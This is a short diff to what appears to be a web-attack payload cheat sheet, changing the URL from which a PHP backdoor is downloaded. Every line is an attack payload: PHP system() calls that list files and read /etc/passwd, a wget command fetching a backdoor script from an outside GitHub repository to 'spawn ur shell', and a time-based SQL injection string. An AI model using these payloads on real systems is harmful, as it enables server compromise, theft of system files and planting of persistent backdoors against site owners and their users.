@@ -6,7 +6,7 @@ ${@system('ls -la')}
 For read phpinfo : <?php phpinfo(); ?>
 For read passwd file : <?php system('tail /etc/passwd'); ?>
 For read all file in this directory : <?php system('dir'); ?>
-For spawn ur shell : <?php system('wget https://raw.githubusercontent.com/Sultan1337/backdoor/main/hidden.php'); ?>
+For spawn ur shell : <?php system('wget https://raw.githubusercontent.com/storage1337/backdoor/main/oneline.php'); ?>
 
 ~SQL INJECTION~
 (select*from(select(sleep(5)))a)
